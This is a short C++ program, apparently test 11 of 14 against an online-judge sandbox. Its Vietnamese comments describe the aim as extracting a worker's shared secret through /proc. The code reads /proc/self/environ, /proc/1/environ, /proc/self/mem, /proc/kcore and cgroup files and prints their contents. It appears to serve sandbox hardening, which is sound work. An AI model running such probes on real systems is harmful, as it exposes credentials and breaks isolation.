// Tấn công 11/14 — moi secret qua /proc.
// Worker cầm OJ_INTERNAL_SHARED_SECRET trong biến môi trường. Nếu box thấy /proc
// của tiến trình cha, cả hệ thống nội bộ mở toang.
#include <cstdio>
int main() {
    const char* paths[] = {"/proc/self/environ", "/proc/self/mem", "/proc/self/maps",
                           "/proc/1/environ", "/proc/1/cmdline", "/proc/kcore",
                           "/proc/cmdline", "/sys/fs/cgroup/cgroup.procs"};
    for (const char* p : paths) {
        FILE* f = fopen(p, "r");
        if (!f) continue;
        char buf[512] = {0};
        size_t n = fread(buf, 1, sizeof buf - 1, f);
        fclose(f);
        printf("LEAK:%s bytes=%zu\n", p, n);
        for (size_t i = 0; i + 1 < n; ++i) if (!buf[i]) buf[i] = ' ';
        printf("  %s\n", buf);
    }
    printf("DONE\n");
    return 0;
}
